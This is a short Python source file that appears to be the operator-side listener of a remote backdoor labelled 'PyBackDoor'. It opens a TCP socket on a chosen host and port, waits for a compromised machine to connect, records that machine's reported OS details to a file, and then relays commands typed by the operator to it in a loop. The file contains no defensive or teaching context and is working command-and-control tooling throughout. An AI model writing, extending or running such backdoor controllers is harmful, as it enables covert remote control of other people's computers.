import subprocess
import os
from socket import *

# colors
NONE = "\033[0m"
BOLD = "\033[1m"
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BLUE = "\033[34m"
MAGENTA = "\033[35m"
CYAN = "\033[36m"
def phantomblitz_listen(LHOST,LPORT):
    print('Starting connection...')
    connection = socket(AF_INET, SOCK_STREAM)
    connection.bind((LHOST, LPORT))
    connection.listen(1)
    print( f'{NONE}({RED}!{NONE}){GREEN}Listening on:'+ LHOST+':'+str(LPORT)+"...\n")
    client, addr = connection.accept()
    print(f"{NONE}{BLUE}connection{NONE}{RED} ->{NONE}{GREEN} " + str(addr))
    while True:
        receiver = client.recv(1024).decode()
        
        if '[OS INFO]' in receiver:
            with open('client_info.txt','w') as session_file:
                os_info = "PyBackDoor\n----------\nOS INFO \n "+receiver
                session_file.write(os_info)
        print(receiver)
        cmd = input(str(addr)+"-> ")
        if cmd == "exit":
            client.send(cmd.encode())
            exit()
        elif cmd == "" or cmd == None:
            cmd = "----"
            client.send(cmd.encode())
        else:
            client.send(cmd.encode())
